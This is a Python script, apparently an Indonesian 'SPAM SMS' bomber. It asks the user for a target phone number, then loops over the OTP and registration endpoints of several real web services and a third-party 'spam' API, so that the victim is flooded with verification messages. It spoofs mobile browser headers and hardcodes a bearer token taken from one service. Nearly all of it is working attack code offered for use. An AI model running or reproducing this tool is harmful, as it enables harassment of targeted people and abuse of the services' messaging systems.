


import os,sys,time,re,requests,json
from requests import post
from time import sleep
def kata(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def intro(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def intro1(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def intro3(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)        
def alodoc():
    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
def soplai():
    ua={
    "Host": "api.sooplai.com",
    "accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "origin": "https://www.sooplai.com",
    "referer": "https://www.sooplai.com/register",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://api.sooplai.com/customer/register/otp/request", data=dat, headers=ua)
def depop():
    ua={
    "Host": "webapi.depop.com",
    "accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    dat=json.dumps({"phone_number":no,"country_code":"ID"})
    r = requests.put("https://webapi.depop.com/api/auth/v1/verify/phone", data=dat, headers=ua)
def rupa():
     ua={
     "Host": "wapi.ruparupa.com",
     "Connection": "keep-alive",
     "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
     "Accept": "application/json",
     "Content-Type": "application/json",
     "X-Company-Name": "odi",
     "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
     "user-platform": "mobile",
     "X-Frontend-Type": "mobile",
     "Origin": "https://m.ruparupa.com",
     "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
     "Accept-Encoding": "gzip, deflate, br",
     "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
     }
     dat=json.dumps({"phone":no,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0})
     r = requests.post("https://wapi.ruparupa.com/auth/generate-otp", data=dat, headers=ua).text   
def marco():
    ua={
    "Host": "www.idmarco.com",
    "accept": "*/*",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
    }
    d={"phone":no}
    r = requests.post("https://www.idmarco.com/smsotp/login/sendotp/", data=d, headers=ua)
    if r:
        print ("\033[1;33m[√] \033[1;97mSUCCES MENGIRIM PESAN KE",no)    
def mapclub():
    ua={
    "Host": "cmsapi.mapclub.com",
    "Connection": "keep-alive",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "content-type": "application/json",
    "Origin": "https://www.mapclub.com",
    "Referer": "https://www.mapclub.com/en/user/signup",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
    if "ok" in r:
        print ("\033[1;33m[√] \033[1;97mSUCCES MENGIRIM PESAN KE",no)
    else:
        print ("\033[1;33m[!] \033[1;97mGAGAL MENGIRIM PESAN, MOHON CEK NOMOR TARGET")
        time.sleep(4)
        print ("\033[1;33m[!] \033[1;97mGAGAL MENGIRIM PESAN, MOHON CEK NOMOR TARGET")
        time.sleep(4) 
        print ("\033[1;33m[!] \033[1;97mGAGAL MENGIRIM PESAN, MOHON CEK NOMOR TARGET\n\n")
        time.sleep(1)
        sys.exit()
os.system("clear")
time.sleep(1)
kata("""\033[1;96m[!] Loading Cuk. . .
\033[1;96mOrang sabar disayang tuhan:)""")
time.sleep(10)

os.system("clear")
intro("""
\033[1;96m╔═╗\033[1;97m╦═╗╔═╗╔╦╗     \033[1;96m╔═╗\033[1;97m╔╦╗╔═╗
\033[1;96m╚═╗\033[1;97m╠═╝╠═╣║║║ <•> \033[1;96m╚═╗\033[1;97m║║║╚═╗
\033[1;96m╚═╝\033[1;97m╩  ╩ ╩╩ ╩     \033[1;96m╚═╝\033[1;97m╩ ╩╚═╝\033[1;33mV2""")
intro1("""
\033[1;96m╔════════════════════════════════╗
\033[1;96m║\033[1;33m➢ \033[1;97mAuthor : \033[1;33m1MB0T          \033[1;96m║
\033[1;96m║\033[1;33m➣ \033[1;97mYouTube: \033[1;33m   ☠⃢⃟☢BLACK•WOLF☠⃢⃟☢     \033[1;96m║
\033[1;96m║\033[1;33m➢ \033[1;97mContoh : \033[1;33mGunakan +62          \033[1;96m║
\033[1;96m╚════════════════════════════════╝\n""")
time.sleep(1)
no = input("\033[1;33m[+] \033[1;97mMasukan No Target : \033[1;33m")
intro3("\033[1;33m[+] \033[1;97mStatus :\033[1;97m")
for i in range(1,4):
    sleep(1)
    alodoc()
    soplai()
    depop()
    rupa()
    marco()
    mapclub()
